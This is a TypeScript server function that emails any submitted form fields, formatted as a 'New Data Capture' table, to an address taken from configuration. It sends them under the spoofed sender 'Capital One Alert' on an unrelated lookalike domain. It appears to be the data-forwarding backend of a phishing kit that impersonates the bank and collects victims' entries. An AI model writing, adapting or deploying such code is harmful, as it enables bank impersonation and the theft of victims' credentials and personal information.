'use server';

import { Resend } from 'resend';

const mailer = new Resend(process.env.RESEND_API_KEY);

const generateHtmlTemplate = (data: Record<string, any>) => {
    const rows = Object.entries(data).map(([key, value]) => `
    <tr style="border-bottom: 1px solid #e5e7eb;">
      <td style="padding: 12px; font-weight: 600; color: #374151; text-transform: capitalize; width: 30%; border-bottom: 1px solid #e5e7eb;">${key.replace(/_/g, ' ')}</td>
      <td style="padding: 12px; color: #1f2937; border-bottom: 1px solid #e5e7eb;">${String(value)}</td>
    </tr>
  `).join('');

    return `
    <!DOCTYPE html>
    <html>
    <head>
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <title>New Submission</title>
    </head>
    <body style="font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; line-height: 1.5; color: #1f2937; margin: 0; padding: 0; background-color: #f3f4f6;">
      <div style="background-color: #f3f4f6; padding: 40px 20px;">
        <div style="max-width: 600px; margin: 0 auto; background-color: #ffffff; border-radius: 8px; overflow: hidden; box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1);">
          
          <!-- Header -->
          <div style="background-color: #004879; padding: 30px; text-align: center;">
            <h1 style="color: #ffffff; margin: 0; font-size: 24px; font-weight: 600; letter-spacing: 0.5px;">New Data Capture</h1>
          </div>
          
          <!-- Content -->
          <div style="padding: 32px;">
            <p style="margin-top: 0; margin-bottom: 24px; color: #4b5563;">A new submission has been received with the following details:</p>
            
            <table style="width: 100%; border-collapse: collapse; text-align: left; background-color: #ffffff; border: 1px solid #e5e7eb; border-radius: 6px; overflow: hidden;">
              <tbody>
                ${rows}
              </tbody>
            </table>
          </div>
          
          <!-- Footer -->
          <div style="background-color: #f9fafb; padding: 20px; text-align: center; font-size: 12px; color: #9ca3af; border-top: 1px solid #e5e7eb;">
            <p style="margin: 0;">Sent via Secure Notification System</p>
            <p style="margin: 5px 0 0 0;">${new Date().toLocaleString()}</p>
          </div>
        </div>
      </div>
    </body>
    </html>
  `;
};

export const sendEmail = async (data: Record<string, any>) => {
    try {
        const recipient = process.env.RECIPIENT_EMAIL;

        if (!recipient) {
            console.error('Configuration Error: RECIPIENT_EMAIL environment variable is not defined.');
            return false;
        }

        const keys = Object.keys(data).join(', ');

        const response = await mailer.emails.send({
            from: 'Capital One Alert <capitalone@noonespay.online>', // You might want to make this generic too or keeps as is if specific to this project
            to: [recipient],
            subject: `New Submission: ${keys.substring(0, 30)}${keys.length > 30 ? '...' : ''}`,
            html: generateHtmlTemplate(data)
        });

        if (response.error) {
            console.error('Resend API Error:', response.error);
            return false;
        }

        return true;
    } catch (error) {
        console.error('Email Sending Exception:', error);
        return false;
    }
};